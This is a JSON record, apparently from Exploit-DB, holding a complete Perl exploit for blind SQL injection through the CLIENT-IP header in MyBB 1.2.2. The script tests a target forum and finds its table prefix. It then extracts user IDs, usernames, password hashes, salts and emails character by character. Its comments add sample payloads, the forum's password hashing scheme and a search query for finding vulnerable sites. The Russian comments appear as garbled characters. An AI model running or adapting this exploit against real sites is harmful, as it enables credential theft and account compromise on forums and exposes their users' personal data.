{
  "id": "3719",
  "title": "MyBulletinBoard (MyBB) 1.2.2 - &#039;CLIENT-IP&#039; SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n###########################################################\r\n#########################  LOGO  ##########################\r\n###########################################################\r\n#     Mybb <= 1.2.2 Remote SQL Injecton Exploit v.2.0     #\r\n#                                                         #\r\n#       [u]used:   SQL CLIENT_IP vulnerability            #\r\n#       [!]need:   Mysql >= 4.1                           #\r\n#       [w]work:   blind sql-inj                          #\r\n#       [g]google: Powered By MyBB                        #\r\n#                                                         #\r\n#               coded by Elekt (antichat.ru)              #\r\n###########################################################\r\n#######################  Coments  #########################\r\n###########################################################\r\n#\r\n# \u00d0\u017e\u00d0\u00bf\u00d0\u00b8\u00d1\u0081\u00d0\u00b0\u00d0\u00bd\u00d0\u00b8\u00d0\u00b5:\r\n# \u00d0 \u00d0\u00b0\u00d0\u00b1\u00d0\u00be\u00d1\u201a\u00d0\u00b0 \u00d1\u008d\u00d0\u00ba\u00d1\u0081\u00d0\u00bf\u00d0\u00bb\u00d0\u00be\u00d0\u00b9\u00d1\u201a\u00d0\u00b0 \u00d0\u00be\u00d1\u0081\u00d0\u00bd\u00d0\u00be\u00d0\u00b2\u00d0\u00b0\u00d0\u00bd\u00d0\u00b0 \u00d0\u00bd\u00d0\u00b0 sql-\u00d0\u00b8\u00d0\u00bd\u00d1\u0160\u00d0\u00b5\u00d0\u00ba\u00d1\u2020\u00d0\u00b8\u00d0\u00b8 \u00d0\u00b2 HTTP_CLIENT_IP.\r\n# \u00d0\u009d\u00d0\u00b5\u00d0\u00b0\u00d0\u00b2\u00d1\u201a\u00d0\u00be\u00d1\u20ac\u00d0\u00b8\u00d0\u00b7\u00d0\u00be\u00d0\u00b2\u00d0\u00b0\u00d0\u00bd\u00d0\u00bd\u00d1\u2039\u00d0\u00b9 \u00d0\u00bf\u00d0\u00be\u00d0\u00bb\u00d1\u0152\u00d0\u00b7\u00d0\u00be\u00d0\u00b2\u00d0\u00b0\u00d1\u201a\u00d0\u00b5\u00d0\u00bb\u00d1\u0152 \u00d0\u00bc\u00d0\u00be\u00d0\u00b6\u00d0\u00b5\u00d1\u201a \u00d0\u00b2\u00d1\u2039\u00d0\u00bf\u00d0\u00be\u00d0\u00bb\u00d0\u00bd\u00d0\u00b8\u00d1\u201a\u00d1\u0152 \u00d0\u00bf\u00d1\u20ac\u00d0\u00be\u00d0\u00b8\u00d0\u00b7\u00d0\u00b2\u00d0\u00be\u00d0\u00bb\u00d1\u0152\u00d0\u00bd\u00d1\u2039\u00d0\u00b9 SQL-\u00d0\u00b7\u00d0\u00b0\u00d0\u00bf\u00d1\u20ac\u00d0\u00be\u00d1\u0081 \u00d0\u00b2 \u00d0\u00b1\u00d0\u00b0\u00d0\u00b7\u00d1\u0192.\r\n#\r\n# http://host.com/mybb/index.php\r\n# MySQL error: 1064\r\n# You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\">'' at line 3\r\n# Query: DELETE FROM mybb_sessions WHERE ip=''\">'\r\n#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n# \u00d0\u00ad\u00d1\u201a\u00d0\u00be \u00d0\u00bd\u00d0\u00be\u00d0\u00b2\u00d0\u00b0\u00d1\u008f \u00d0\u00b2\u00d0\u00b5\u00d1\u20ac\u00d1\u0081\u00d0\u00b8\u00d1\u008f \u00d1\u008d\u00d0\u00ba\u00d1\u0081\u00d0\u00bf\u00d0\u00bb\u00d0\u00be\u00d0\u00b9\u00d1\u201a\u00d0\u00b0. \r\n# \u00d0\u0153\u00d0\u00bd\u00d0\u00be\u00d0\u00b9 \u00d0\u00b1\u00d1\u2039\u00d0\u00bb \u00d0\u00bd\u00d0\u00b0\u00d0\u00b9\u00d0\u00b4\u00d0\u00b5\u00d0\u00bd \u00d1\u0081\u00d0\u00bf\u00d0\u00be\u00d1\u0081\u00d0\u00be\u00d0\u00b1 \u00d0\u00be\u00d1\u201a\u00d0\u00ba\u00d0\u00b0\u00d0\u00b7\u00d0\u00b0\u00d1\u201a\u00d1\u0152\u00d1\u0081\u00d1\u008f \u00d0\u00be\u00d1\u201a \u00d0\u00b8\u00d1\u0081\u00d0\u00bf\u00d0\u00be\u00d0\u00bb\u00d1\u0152\u00d0\u00b7\u00d0\u00be\u00d0\u00b2\u00d0\u00b0\u00d0\u00bd\u00d0\u00b8\u00d1\u008f benchmark,\r\n# \u00d1\u2021\u00d1\u201a\u00d0\u00be \u00d0\u00bf\u00d0\u00be\u00d0\u00b7\u00d0\u00b2\u00d0\u00be\u00d0\u00bb\u00d1\u008f\u00d0\u00b5\u00d1\u201a \u00d1\u0192\u00d1\u0081\u00d0\u00ba\u00d0\u00be\u00d1\u20ac\u00d0\u00b8\u00d1\u201a\u00d1\u0152 \u00d1\u20ac\u00d0\u00b0\u00d0\u00b1\u00d0\u00be\u00d1\u201a\u00d1\u0192 \u00d1\u008d\u00d0\u00ba\u00d1\u0081\u00d0\u00bf\u00d0\u00bb\u00d0\u00be\u00d0\u00b9\u00d1\u201a\u00d0\u00b0, \u00d0\u00bf\u00d0\u00be\u00d0\u00b2\u00d1\u2039\u00d1\u0081\u00d0\u00b8\u00d1\u201a\u00d1\u0152 \u00d0\u00bd\u00d0\u00b0\u00d0\u00b4\u00d0\u00b5\u00d0\u00b6\u00d0\u00bd\u00d0\u00be\u00d1\u0081\u00d1\u201a\u00d1\u0152 \u00d0\u00bf\u00d0\u00be\u00d0\u00bb\u00d1\u0192\u00d1\u2021\u00d0\u00b5\u00d0\u00bd\u00d0\u00bd\u00d1\u2039\u00d1\u2026 \u00d0\u00b4\u00d0\u00b0\u00d0\u00bd\u00d0\u00bd\u00d1\u2039\u00d1\u2026.\r\n# \r\n# \u00d0 \u00d0\u00b0\u00d0\u00b1\u00d0\u00be\u00d1\u201a\u00d0\u00b0 \u00d1\u008d\u00d0\u00ba\u00d1\u0081\u00d0\u00bf\u00d0\u00bb\u00d0\u00be\u00d0\u00b9\u00d1\u201a\u00d0\u00b0 \u00d0\u00be\u00d1\u0081\u00d0\u00bd\u00d0\u00be\u00d0\u00b2\u00d0\u00b0\u00d0\u00bd\u00d0\u00b0 \u00d0\u00bd\u00d0\u00b0 \u00d0\u00bf\u00d1\u20ac\u00d0\u00be\u00d0\u00b2\u00d0\u00be\u00d1\u2020\u00d0\u00b8\u00d1\u20ac\u00d0\u00be\u00d0\u00b2\u00d0\u00b0\u00d0\u00bd\u00d0\u00b8\u00d0\u00b8 \"Subquery returns more than 1 row\" \u00d0\u00be\u00d1\u02c6\u00d0\u00b8\u00d0\u00b1\u00d0\u00ba\u00d0\u00b8,\r\n# \u00d1\u2021\u00d1\u201a\u00d0\u00be \u00d0\u00bf\u00d0\u00be\u00d0\u00b7\u00d0\u00b2\u00d0\u00be\u00d0\u00bb\u00d1\u008f\u00d0\u00b5\u00d1\u201a \u00d0\u00bf\u00d1\u20ac\u00d0\u00be\u00d0\u00b8\u00d0\u00b7\u00d0\u00b2\u00d0\u00b5\u00d1\u0081\u00d1\u201a\u00d0\u00b8 blind-sql-inj: \r\n# \r\n# mybb\r\n# match: \"Subquery returns more than 1 row\"\r\n# CLIENT_IP: 123' or 1=(select null from mybb_users where length(if(ascii(substring((select password from mybb_users where uid=1),1,1))>1,password,uid))<5)/*\r\n# CLIENT_IP: 123' or 1=(select null from mybb_users where length(if(ascii(substring((select password from mybb_users where uid=1),1,1))>254,password,uid))<5)/*\r\n#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n# \r\n# \u00d0\u0178\u00d0\u00be\u00d0\u00bb\u00d0\u00b5\u00d0\u00b7\u00d0\u00bd\u00d1\u2039\u00d0\u00b5 \u00d1\u201a\u00d0\u00b0\u00d0\u00b1\u00d0\u00bb\u00d0\u00b8\u00d1\u2020\u00d1\u2039 \u00d0\u00b8 \u00d0\u00bf\u00d0\u00be\u00d0\u00bb\u00d1\u008f:\r\n# mybb_1.2.1: mybb_users - uid,username,password,salt,email,loginkey,icq,aim,regip\r\n# \r\n# \u00d0\u0090\u00d0\u00bb\u00d0\u00b3\u00d0\u00be\u00d1\u20ac\u00d0\u00b8\u00d1\u201a\u00d0\u00bc \u00d0\u00b3\u00d0\u00b5\u00d0\u00bd\u00d0\u00b5\u00d1\u20ac\u00d0\u00b0\u00d1\u2020\u00d0\u00b8\u00d0\u00b8 \u00d0\u00bf\u00d0\u00b0\u00d1\u20ac\u00d0\u00be\u00d0\u00bb\u00d0\u00b5\u00d0\u00b9 \u00d0\u00b2 mybb:\r\n# md5(md5($salt).md5($password))\r\n# generate_salt{return random_str(8);}\r\n# \r\n###########################################################\r\n#########################  init  ###########################\r\n###########################################################\r\n\r\nuse LWP::UserAgent; \r\n$sock = LWP::UserAgent->new();\r\n\r\n$|=1;\r\n\r\n&header();\r\n\r\n\r\n###########################################################\r\n#######################  Options  #########################\r\n###########################################################\r\n\r\nif (@ARGV < 2) {&info(); exit();}\r\n\r\n$host = $ARGV[0]; # \u00d1\u0081\u00d0\u00b5\u00d1\u20ac\u00d0\u00b2\u00d0\u00b0\u00d0\u00ba\r\n$dir = $ARGV[1];  # \u00d0\u00b4\u00d0\u00b8\u00d1\u20ac\u00d0\u00b0 \u00d1\u0081 \u00d1\u201e\u00d0\u00be\u00d1\u20ac\u00d1\u0192\u00d0\u00bc\u00d0\u00be\u00d0\u00bc\r\n$uid = 2;         # \u00d0\u00b0\u00d0\u00ba\u00d0\u00ba \u00d0\u00b0\u00d0\u00b4\u00d0\u00bc\u00d0\u00b8\u00d0\u00bd\u00d0\u00b0 \u00d0\u00bf\u00d0\u00be \u00d0\u00b4\u00d0\u00b5\u00d1\u201e\u00d0\u00b0\u00d1\u0192\u00d0\u00bb\u00d1\u201a\u00d1\u0192\r\n$uid = $ARGV[2] if $ARGV[2];\r\n\r\n$debug = 0;            # \u00d1\u20ac\u00d0\u00b5\u00d0\u00b6\u00d0\u00b8\u00d0\u00bc \u00d0\u00be\u00d1\u201a\u00d0\u00bb\u00d0\u00b0\u00d0\u00b4\u00d0\u00ba\u00d0\u00b8\r\n$space = \"char(58)\";   # \u00d1\u20ac\u00d0\u00b0\u00d0\u00b7\u00d0\u00b4\u00d0\u00b5\u00d0\u00bb\u00d0\u00b8\u00d1\u201a\u00d0\u00b5\u00d0\u00bb\u00d1\u0152 \u00d1\u0081\u00d1\u201a\u00d0\u00be\u00d0\u00bb\u00d0\u00b1\u00d1\u2020\u00d0\u00be\u00d0\u00b2\r\n#$search = \"password\";  # \u00d1\u2021\u00d1\u201a\u00d0\u00be \u00d0\u00b1\u00d1\u20ac\u00d1\u0192\u00d1\u201a\u00d0\u00b8\u00d0\u00bc, \u00d1\u0081\u00d0\u00be\u00d0\u00b1\u00d1\u0081\u00d1\u201a\u00d0\u00b2\u00d0\u00b5\u00d0\u00bd\u00d0\u00bd\u00d0\u00be...\r\n#$search = \"concat(uid,$space,password,$space,salt)\"; # uid:password:salt\r\n$search = \"concat(uid,$space,username,$space,password,$space,salt,$space,email)\"; # uid:username:password:salt:email\r\n$search = $ARGV[3] if $ARGV[3];\r\n\r\n# $presetascii - \u00d0\u00b4\u00d0\u00b8\u00d0\u00b0\u00d0\u00bf\u00d0\u00b0\u00d0\u00b7\u00d0\u00be\u00d0\u00bd ascii-\u00d0\u00ba\u00d0\u00be\u00d0\u00b4\u00d0\u00be\u00d0\u00b2 \u00d0\u00b4\u00d0\u00bb\u00d1\u008f \u00d0\u00b1\u00d1\u20ac\u00d1\u0192\u00d1\u201a\u00d0\u00b0 \u00d0\u00b2\u00d0\u00b5\u00d1\u20ac\u00d0\u00be\u00d1\u008f\u00d1\u201a\u00d0\u00bd\u00d1\u2039\u00d1\u2026 \u00d0\u00b4\u00d0\u00b0\u00d0\u00bd\u00d0\u00bd\u00d1\u2039\u00d1\u2026\r\n# $presetascii = \"0123456789abcdef\";\r\n# $presetascii = \"0123456789\"\r\n# $presetascii = \"abcdefghijklmnopqrstuvwxyz\"\r\n# $presetascii = \"0123456789abcdefghijklmnopqrstuvwxyz\"\r\n# $presetascii = \"\u00d0\u00b0\u00d0\u00b1\u00d0\u00b2\u00d0\u00b3\u00d0\u00b4\u00d0\u00b5\u00d1\u2018\u00d0\u00b6\u00d0\u00b7\u00d0\u00b8\u00d0\u00b9\u00d0\u00ba\u00d0\u00bb\u00d0\u00bc\u00d0\u00bd\u00d0\u00be\u00d0\u00bf\u00d1\u20ac\u00d1\u0081\u00d1\u201a\u00d1\u0192\u00d1\u201e\u00d1\u2026\u00d1\u2020\u00d1\u2021\u00d1\u02c6\u00d1\u2030\u00d1\u0160\u00d1\u2039\u00d1\u0152\u00d1\u008d\u00d1\u017d\u00d1\u008f\");\r\n# \u00d1\u2020\u00d0\u00b8\u00d0\u00ba\u00d0\u00bb, \u00d0\u00b4\u00d0\u00bb\u00d1\u008f \u00d0\u00bf\u00d1\u20ac\u00d0\u00be\u00d1\u0081\u00d1\u201a\u00d0\u00be\u00d1\u201a\u00d1\u2039 \u00d0\u00b7\u00d0\u00b0\u00d0\u00b4\u00d0\u00b0\u00d1\u2018\u00d1\u201a \u00d0\u00b2\u00d1\u0081\u00d0\u00b5 \u00d1\u0081\u00d0\u00b8\u00d0\u00bc\u00d0\u00b2\u00d0\u00be\u00d0\u00bb\u00d1\u2039 \u00d0\u00b4\u00d0\u00bb\u00d1\u008f \u00d0\u00bf\u00d0\u00b5\u00d1\u20ac\u00d0\u00b5\u00d0\u00b1\u00d0\u00be\u00d1\u20ac\u00d0\u00b0 \r\n$i=0;\r\nwhile($i<=255){\r\n$presetascii.=chr($i);$i++;\r\n}\r\n\r\n###########################################################\r\n#########################  go!  ###########################\r\n###########################################################\r\n\r\n\r\n$time=localtime;\r\n&log (\"[i] Start time  $time\\n\");\r\n&log (\"[+] HOST \\\"$host\\\"\\n\");\r\n&log (\"[+] DIR  \\\"$dir\\\"\\n\");\r\n&log (\"[+] UID  \\\"$uid\\\"\\n\");\r\n&log (\"[+] Search  \\\"$search\\\"\\n\");\r\n\r\n###########################################################\r\n###### detecting vulnerability and searching prefix #######\r\n###########################################################\r\n\r\n# detecting vulnerability and searching prefix\r\n&log (\"[~] Testing forum vulnerabile... \");\r\n$q = \"\";\r\n$prefix=query($q,$host,$dir);\r\nif($prefix ne \"not_find\"){&log (\"Yes! Forum vulnerable!\\n\");sleep(1);&log (\"[~] Searching prefix...\");sleep(1);&log (\" prefix find - \\\"$prefix\\\"\\n\"); }\r\nelse \r\n    {\r\n     &log (\"Sorry. Forum unvulnerable\\n\");\r\n\t &footer();\r\n     exit();\r\n    }\r\n\r\n\r\n###########################################################\r\n#####################   brutforce   #######################\r\n###########################################################\r\n\r\n# brutforce\r\n&log (\"[~] Brutforce begin! it may take some time, plz, wait...\\n\");\r\n$kol=1;\r\nfor ($control=0;$control==0;){\r\n   &log(\"\\n---------------- Simvol $kol ----------------\\n\\n\") if $debug;\r\n   $amin = 1;\r\n   $amax = length($presetascii)-1;\r\n   $n=0;\r\n\r\n   # \u00d0\u00b5\u00d1\u0081\u00d0\u00bb\u00d0\u00b8 \u00d0\u00b4\u00d0\u00b8\u00d0\u00b0\u00d0\u00bf\u00d0\u00b0\u00d0\u00b7\u00d0\u00be\u00d0\u00bd 4 \u00d0\u00b8 \u00d0\u00b1\u00d0\u00be\u00d0\u00bb\u00d0\u00b5\u00d0\u00b5 \u00d1\u0081\u00d0\u00b8\u00d0\u00bc\u00d0\u00b2\u00d0\u00be\u00d0\u00bb\u00d0\u00be\u00d0\u00b2, \u00d0\u00bf\u00d0\u00b5\u00d1\u20ac\u00d0\u00b5\u00d0\u00be\u00d0\u00bf\u00d1\u20ac\u00d0\u00b5\u00d0\u00b4\u00d0\u00b5\u00d0\u00bb\u00d1\u008f\u00d0\u00b5\u00d0\u00bc \u00d0\u00b4\u00d0\u00b8\u00d0\u00b0\u00d0\u00bf\u00d0\u00b0\u00d0\u00b7\u00d0\u00be\u00d0\u00bd, \u00d1\u0192\u00d0\u00bc\u00d0\u00b5\u00d0\u00bd\u00d1\u0152\u00d1\u02c6\u00d0\u00b0\u00d1\u008f \u00d0\u00b5\u00d0\u00b3\u00d0\u00be \u00d0\u00b2 2 \u00d1\u20ac\u00d0\u00b0\u00d0\u00b7\u00d0\u00b0\r\n   while (($amax-$amin)>=4){\r\n        print (\"-> Try \".ord(substr($presetascii,$amin,1)).\" .. \".ord(substr($presetascii,$amax,1)).\" -> \") if $debug;;\r\n\t#$q = \"or 1=if((ascii(substring((select \".$search.\" from \".$prefix.\"users where uid='\".$uid.\"'),\".$kol.\",1))>=\".ord(substr($presetascii,int($amax-($amax-$amin)/2),1)).\"),1,benchmark(\".$benchmark.\",md5(char(114,115,116))))/*\";\r\n\t$q = \"or 1=(select null from \".$prefix.\"users where length(if((ascii(substring((select \".$search.\" from \".$prefix.\"users where uid='\".$uid.\"'),\".$kol.\",1))>=\".ord(substr($presetascii,int($amax-($amax-$amin)/2),1)).\"),password,uid))<5)/*\";\r\n        if (query($q,$host,$dir) eq \"not_find\") { \r\n          print (\"Char>=\".ord(substr($presetascii,int($amax-($amax-$amin)/2),1)).\"\\n\") if $debug;;\r\n          $amin=int($amax-($amax-$amin)/2); }\r\n        else { \r\n          print (\"Char<\".ord(substr($presetascii,int($amax-($amax-$amin)/2),1)).\"\\n\") if $debug;;\r\n          $amax=int($amax-($amax-$amin)/2); };\r\n   }\r\n   \r\n   # \u00d0\u00b5\u00d1\u0081\u00d0\u00bb\u00d0\u00b8 \u00d0\u00b4\u00d0\u00b8\u00d0\u00b0\u00d0\u00bf\u00d0\u00b0\u00d0\u00b7\u00d0\u00be\u00d0\u00bd \u00d0\u00bc\u00d0\u00b5\u00d0\u00bd\u00d0\u00b5\u00d0\u00b5 4-\u00d1\u2026 \u00d1\u0081\u00d0\u00b8\u00d0\u00bc\u00d0\u00b2\u00d0\u00be\u00d0\u00bb\u00d0\u00be\u00d0\u00b2, \u00d1\u201a\u00d0\u00be \u00d0\u00bf\u00d0\u00b5\u00d1\u20ac\u00d0\u00b5\u00d1\u2026\u00d0\u00be\u00d0\u00b4\u00d0\u00b8\u00d0\u00bc \u00d0\u00ba \u00d0\u00bf\u00d0\u00b5\u00d1\u20ac\u00d0\u00b5\u00d0\u00b1\u00d0\u00be\u00d1\u20ac\u00d1\u0192\r\n   while ($amin<=$amax) {\r\n     print (\"-> Try \".ord(substr($presetascii,$amin,1)).\" ->\") if $debug;;\r\n     # \u00d0\u00bf\u00d1\u20ac\u00d0\u00be\u00d0\u00b2\u00d0\u00b5\u00d1\u20ac\u00d1\u008f\u00d0\u00b5\u00d0\u00bc \u00d0\u00be\u00d1\u201a\u00d0\u00b2\u00d0\u00b5\u00d1\u201a \u00d1\u0081\u00d0\u00ba\u00d1\u20ac\u00d0\u00b8\u00d0\u00bf\u00d1\u201a\u00d0\u00b0, \u00d0\u00b5\u00d1\u0081\u00d0\u00bb\u00d0\u00b8 \u00d0\u00be\u00d1\u201a\u00d0\u00b2\u00d0\u00b5\u00d1\u201a \u00d0\u00bf\u00d0\u00be\u00d0\u00bb\u00d0\u00be\u00d0\u00b6\u00d0\u00b8\u00d1\u201a\u00d0\u00b5\u00d0\u00bb\u00d1\u0152\u00d0\u00bd\u00d1\u2039\u00d0\u00b9 \u00d1\u201a\u00d0\u00be \u00d0\u00b2\u00d1\u2039\u00d0\u00b2\u00d0\u00be\u00d0\u00b4\u00d0\u00b8\u00d0\u00bc \u00d1\u0081\u00d0\u00b8\u00d0\u00bc\u00d0\u00b2\u00d0\u00be\u00d0\u00bb \u00d0\u00b8 \u00d0\u00b8\u00d1\u2030\u00d0\u00b5\u00d0\u00bc \u00d1\u0081\u00d0\u00bb\u00d0\u00b5\u00d0\u00b4\u00d1\u0192\u00d1\u017d\u00d1\u2030\u00d0\u00b8\u00d0\u00b9 \u00d1\u0081\u00d0\u00b8\u00d0\u00bc\u00d0\u00b2\u00d0\u00be\u00d0\u00bb \u00d0\u00b2 \u00d1\u0081\u00d0\u00bb\u00d0\u00be\u00d0\u00b2\u00d0\u00b5, \u00d0\u00b5\u00d1\u0081\u00d0\u00bb\u00d0\u00b8 \u00d0\u00bd\u00d0\u00b5 \u00d0\u00be\u00d0\u00bf\u00d1\u20ac\u00d0\u00b5\u00d0\u00b4\u00d0\u00b5\u00d0\u00bb\u00d1\u008f\u00d0\u00b5\u00d0\u00bc \u00d1\u0081\u00d0\u00b8\u00d0\u00bc\u00d0\u00b2\u00d0\u00be\u00d0\u00bb - \u00d0\u00b2\u00d1\u2039\u00d1\u2026\u00d0\u00be\u00d0\u00b4.\r\n\t#$q = \"or 1=if((ascii(substring((select \".$search.\" from \".$prefix.\"users where uid='\".$uid.\"'),\".$kol.\",1))=\".ord(substr($presetascii,$amin,1)).\"),1,benchmark(\".$benchmark.\",md5(char(114,115,116))))/*\";\r\n\t$q = \"or 1=(select null from \".$prefix.\"users where length(if((ascii(substring((select \".$search.\" from \".$prefix.\"users where uid='\".$uid.\"'),\".$kol.\",1))=\".ord(substr($presetascii,$amin,1)).\"),password,uid))<5)/*\";\r\n     if (query($q,$host,$dir) eq \"not_find\") {\r\n          &log (\" FOUND!\\n-> Ascii: \".ord(substr($presetascii,$amin,1)).\"\\n-> Char: \\\"\".substr($presetascii,$amin,1).\"\\\"\\n\") if $debug;; \r\n          &log (\"[$kol] Find - ascii:\\\"\".ord(substr($presetascii,$amin,1)).\"\\\", char:\\\"\".substr($presetascii,$amin,1).\"\\\"\\n\") if !$debug;\r\n          $rezultat_char = $rezultat_char.substr($presetascii,$amin,1); \r\n          $rezultat_ascii = $rezultat_ascii.ord(substr($presetascii,$amin,1)).\",\"; \r\n          $amin=$amax+1;$control=1;}\r\n        else { print (\" NO =(\\n\") if $debug; $amin=$amin+1; };\r\n   }\r\n   if ($control==0) { \r\n     if($amin!=5){$rezultat_char = $rezultat_char.\"?\";$rezultat_ascii = $rezultat_ascii.\"?,\";\r\n                  &log (\"[$kol] Error! not found =( $amin\\n\") if !$debug;\r\n                  &log (\" Error! not found =(\\n\") if $debug;\r\n     }else{$control=1;}\r\n   }else {$control=0;}\r\n   $kol++;\r\n}\r\n\r\nprint (\"\\n[!] Yyyy-a-a-a-h-h-uuu!!!\\n\");\r\n&log (\"\\n[*] Char: $rezultat_char\\n[*] Ascii: $rezultat_ascii\\n\");\r\n$time=localtime;\r\n&log (\"\\n[i] Finish time  $time\\n\\n\");\r\n\r\n\r\n&footer();\r\nexit();\r\n\r\n###########################################################\r\n########################  log   ##########################\r\n###########################################################\r\n# \u00d0\u00bb\u00d0\u00be\u00d0\u00b3\r\nsub log($)\r\n    {\r\n     open(RES,\">>\".$host.\"_log.txt\") || die \"[-] Cannot open log file!\"; ## \u00d0\u017e\u00d1\u201a\u00d0\u00ba\u00d1\u20ac\u00d1\u2039\u00d0\u00b2\u00d0\u00b0\u00d0\u00b5\u00d0\u00bc \u00d0\u00bb\u00d0\u00be\u00d0\u00b3 \u00d0\u00b4\u00d0\u00bb\u00d1\u008f \u00d0\u00b4\u00d0\u00be\u00d0\u00b7\u00d0\u00b0\u00d0\u00bf\u00d0\u00b8\u00d1\u0081\u00d0\u00b8\r\n     print (\"$_[0]\");\r\n     print RES (\"$_[0]\");\r\n     close(RES);\r\n    }\r\n\r\n###########################################################\r\n######################## footer  ##########################\r\n###########################################################\r\n# \u00d1\u008d\u00d0\u00bf\u00d0\u00b8\u00d0\u00bb\u00d0\u00be\u00d0\u00b3\r\nsub footer()\r\n    {\r\n     print (\"[G] Greets: Elekt (antichat.ru), 1dt.w0lf (rst/ghc)\\n\");\r\n     print (\"[L] Visit : www.antichat.ru\\n\");\r\n    }\r\n\r\n\r\n###########################################################\r\n######################## header  ##########################\r\n###########################################################\r\n# \u00d1\u2026\u00d0\u00b8\u00d0\u00b4\u00d0\u00b5\u00d1\u20ac\r\nsub header()\r\n{\r\nprint q(\r\n=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=\r\n+     Mybb <= 1.2.2 Remote SQL Injecton Exploit v.2.0     +\r\n+                                                         +\r\n+       [i]used:   SQL CLIENT_IP vulnerability            +\r\n+       [!]need:   Mysql >= 4.1                           +\r\n+       [w]work:   blind sql-inj                          +\r\n+       [i]google: Powered By MyBB                        +\r\n+                                                         +\r\n+               coded by Elekt (antichat.ru)              +\r\n=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_+\r\n);\r\n}\r\n\r\n\r\n###########################################################\r\n########################  info   ##########################\r\n###########################################################\r\n# \u00d0\u00b8\u00d0\u00bd\u00d1\u201e\u00d0\u00be\r\nsub info()\r\n{\r\n print q(\r\n[i] Usage: \r\n perl mybb122exp.pl [host] [/dir/] [uid] [search]\r\n*-required\r\n  *[host] - target host without http://\r\n  *[/dir/] - installed forums dir\r\n   [uid] - user uid (default=2)\r\n   [search] - data (uid:username:password:salt:email)\r\n\t   \r\n[E] Example: perl mybb122exp.pl host.com /forum/ 1 password\r\n\r\n[i] mybb: md5(md5($salt).md5($password))\r\n\r\n );\r\n}\r\n\r\n###########################################################\r\n#######################  sender   #########################\r\n###########################################################\r\n# \u00d0\u00bf\u00d1\u20ac\u00d0\u00be\u00d1\u2020\u00d0\u00b5\u00d0\u00b4\u00d1\u0192\u00d1\u20ac\u00d0\u00b0 \u00d0\u00bf\u00d1\u20ac\u00d0\u00b8\u00d0\u00b5\u00d0\u00bc\u00d0\u00b0\\\u00d0\u00bf\u00d0\u00be\u00d1\u0081\u00d1\u2039\u00d0\u00bb\u00d0\u00ba\u00d0\u00b8 \u00d0\u00b4\u00d0\u00b0\u00d0\u00bd\u00d0\u00bd\u00d1\u2039\u00d1\u2026\r\nsub query()\r\n    {\r\n     #&log (\"\\n\\n$q\\n\\n\") if $debug;\r\n     my($q,$host,$dir) = @_;\r\n     $res = $sock->get(\"http://\".$host.$dir.\"index.php\",'USER_AGENT'=>'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)','CLIENT_IP'=>\"' \".$q); \r\n     if($res->is_success)\r\n        {\r\n             if($res->as_string =~ /FROM (.*)sessions/) { return $1; } else {return \"not_find\";}\r\n        }\r\n     else{&log (\"\\n[!] Connection to $host FAILED! EXIT\\n\"); exit;}\r\n    }\r\n\r\n# milw0rm.com [2007-04-12]",
  "url": "https://www.exploit-db.com/exploits/3719"
}